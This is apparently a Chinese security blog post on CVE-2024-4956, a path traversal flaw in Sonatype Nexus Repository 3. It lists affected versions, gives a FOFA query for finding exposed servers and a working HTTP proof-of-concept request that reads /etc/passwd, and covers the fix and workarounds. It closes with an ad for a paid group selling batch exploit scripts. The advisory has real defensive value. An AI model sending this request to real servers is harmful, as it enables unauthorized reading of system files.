#  Sonatype Nexus Repository 3 路径遍历漏洞(CVE-2024-4956)   
冷漠安全  冷漠安全   2024-05-25 23:07  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qRzaH5GUoT3wjfxgNKKQaVgq5UdQuTjibZ7l0YMRTIbMrfABFictia4ZEXKWAic1RbHRib9CiajtbcKQcw/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
Sonatype Nexus Repository 是美国Sonatype公司的一款存储库管理器，用于存储和分发软件组件、构建工件和 Docker 容器。它支持多种包格式，与 CI/CD 工具集成，并提供安全性和合规性功能  
。  
  
0x03  
  
**漏洞威胁**  
  
2024年5月，Nexus Repository官方Sonatype发布了新补丁，修复了一处路径穿越漏洞CVE-2024-4956。经分析，该漏洞可以通过特定的路径请求来未授权访问系统文件，进而可能导致信息泄露。该漏洞无前置条件且利用简单，建议受影响的客户尽快修复漏洞。  
  
Nexus Repository仅依赖Jetty自带的方法进行请求路径的安全检查，而未进行深入的验证，导致攻击者可以利用路径穿越攻击访问文件系统上的任意位置。  
  
成功利用这一漏洞的攻击者可以读取Nexus Repository服务器上的任意文件，这可能包括配置文件、数据库备份以及其他敏感数据。此外，特定情况下如果攻击者能够进一步利用服务器上的其他配置或漏洞，可能会完全控制受影响的服务器。  
  
影响范围：  
```
Sonatype Nexus Repository 3 < 3.68.1
```  
  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
app="Nexus-Repository-Manager"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qMqW20fO5BTb2vMDo7Z79opibU4XdNtWqOAYkk9e3U4AN4m8jdXxeD2LtutgGA6UY2TRQGrrvjpWw/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
POC  
```
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qMqW20fO5BTb2vMDo7Z79oYibibO9ILnl0mws8ffx9JW9DKjPKdcxOyZbXcB9ibGSYDHAItZL5YYcBg/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qMqW20fO5BTb2vMDo7Z79ongghVmpKaScKBxlZLnqaUJhh9lficsU7EvGDIiaTwqib2FNzKjQfr4yCQ/640?wx_fmt=png&from=appmsg "")  
  
0x07  
  
**修复建议**  
  
目前官方已有可更新版本，建议受影响用户升级至最新版本：  
```
Sonatype Nexus Repository 3 < 3.68.1
```  
  
官方下载地址：  
```
https://help.sonatype.com/repomanager3/download
```  
  
缓解方案：  
  
对于 Sonatype Nexus Repository 的每个实例，编辑  
  
(basedir)/etc/jetty/jetty.xml 并从文件中删除这一行：  
```
<Set name="resourceBase"><Property name="karaf.base"/>/public</Set>
```  
  
重新启动 Nexus 存储库以使更改生效。  
  
注意：此更改可防止利用该漏洞，但也会防止应用程序从 （installdir）/public 目录加载文件，可能会导致轻微的UI渲染问题，而不会影响核心产品功能。  
  
如果对 Nexus Repository 的访问受 AWS WAF 规则保护，则 GenericLFI_URIPATH 规则可以防范此漏洞。  
```
https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html
```  
  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0qMqW20fO5BTb2vMDo7Z79oZCc4fLHzS3gEbPMlk5ntRaSEP6kHaaLxhevniaAicsg71zEFDD1Yiat3A/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0qMqW20fO5BTb2vMDo7Z79okBV6w9ZuDwJ6VV3YyNXcibVtLH3iaicPRx4iaGtvhayGzvyziaGhouiaUFBw/640?wx_fmt=gif&from=appmsg "")  
  
  
